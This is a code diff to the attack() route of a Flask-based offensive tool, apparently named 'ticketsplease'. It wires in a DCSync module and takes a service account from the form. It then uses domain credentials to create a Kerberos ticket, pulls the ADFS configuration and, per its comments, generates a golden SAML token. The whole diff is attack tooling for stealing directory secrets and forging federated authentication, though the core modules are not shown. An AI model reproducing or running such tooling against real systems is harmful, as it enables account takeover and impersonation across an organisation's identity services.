@@ -16,7 +16,9 @@
 
 import logging
 import argparse
+import base64
 from flask import Flask, request, render_template  # type: ignore
+from ticketsplease.modules.dcsync import DCSYNC
 from ticketsplease.modules.ticket import create_ticket  # type: ignore
 from ticketsplease.modules.adfs import get_configuration  # type: ignore
 from ticketsplease.modules.saml import generate_golden_saml  # type: ignore
@@ -35,8 +37,9 @@ def attack():
     dc_ip = request.form.get("dc_ip", None)
     domain_username = request.form.get("domain_username", None)
     domain_password = request.form.get("domain_password", None)
+    service_account = request.form.get("service_account", None)
 
-    # First, create a Kerberos ticket
+    # Next, create a Kerberos ticket
     # We are generating a Kerberos ticket for the domain
     # user to authenticate and pull down the ADFS config
     # settings. Since we have the domain username and
@@ -46,8 +49,7 @@ def attack():
     (krb_ticket, cipher, sessionKey) = create_ticket(
         domain=domain,
         host=adfs_host,
-        user=domain_username,
-        user_password=domain_password,
+        user=service_account,
         domain_username=domain_username,
         domain_password=domain_password,
         dc_ip=dc_ip,
@@ -60,7 +62,7 @@ def attack():
         adfs_host=adfs_host,
         ticket=krb_ticket,
         sessionKey=sessionKey,
-        cipher=cipher,
+        cipher=None,
     )
 
     # Finally, use the ADFS config to generate the SAML token
